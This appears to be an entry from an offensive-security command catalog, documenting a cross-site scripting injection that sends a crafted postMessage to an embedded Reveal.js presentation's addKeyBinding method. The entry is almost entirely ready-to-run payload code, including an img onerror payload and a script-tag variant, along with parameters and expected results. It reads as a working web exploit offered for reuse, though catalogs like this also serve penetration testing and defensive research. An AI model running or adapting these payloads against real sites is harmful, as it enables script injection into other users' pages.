---
id: cmd-uuid-3
data: >-
  frame.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img
  src=x onerror=alert(document.domain)>"}]}','*')
tags:
  - injection
  - xss
  - postmessage
type: command
output: Key binding added
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.175Z'
verified: false
validated: true
submitted: true
---
# addKeyBinding-iframe

## Command

```javascript
frame.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}','*');
```

## Description

Sends a postMessage to the iframe's Reveal object to add a key binding with an XSS payload in the description.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | 'addKeyBinding' | Yes |
| args | Array with keyCode, key, description payload | Yes |
| targetOrigin | '*' for any origin | Yes |

## Examples

### Basic Usage

```javascript
frame.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Test","description":"<script>alert(1)</script>"}]}','*');
```

### Advanced Usage

```javascript
// As in data, with specific payload
```

## Expected Output

No visible output; binding added to registeredKeyBindings (check via console: Reveal.getRevealElement().registeredKeyBindings).

## Related

- [[Related Procedure|procedures/Inject-Malicious-Key-Binding-via-postMessage]]
